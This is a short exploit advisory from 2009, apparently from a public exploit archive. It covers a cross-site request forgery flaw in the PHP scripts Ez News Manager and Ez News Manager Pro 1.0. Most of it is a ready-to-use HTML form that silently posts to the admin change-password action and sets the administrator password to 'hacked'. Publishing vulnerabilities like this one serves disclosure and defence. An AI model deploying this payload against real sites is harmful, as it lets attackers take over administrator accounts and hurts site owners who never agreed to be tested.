@@ -1,0 +1,30 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Ez News Manager / Pro - XSRF Change Admin Password
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 15. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Ez News Manager / Ez News Manager Pro
+[#] Version: 1.0
+[#] Platform: PHP
+[#] Link[Pro]: http://www.scriptsez.net/?action=details&cat=News%20Publishing&id=2154687026
+[#] Price: 15 USD
+[#] Link: http://www.scriptsez.net/?action=details&cat=News%20Publishing&id=1194243816
+[#] Price: 10 USD
+[#] Vulnerability: XSRF Change Admin Password
+[#-----------------------------------------------------------------------------------------------#]
+
+Ez News Manager and Ez News Manager Pro scripts lack of cross site
+request forgery protection, allowing us to make exploit to change
+admin password. This exploit works with both scripts:
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://server/enmp/admin.php?action=change_password"
+method="post">
+  <input type="hidden" name="n_pwd" value="hacked">
+  <input type="hidden" name="new_pwd" value="hacked">
+  <input type="submit" name="submit" value="Submit">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[#]EOF
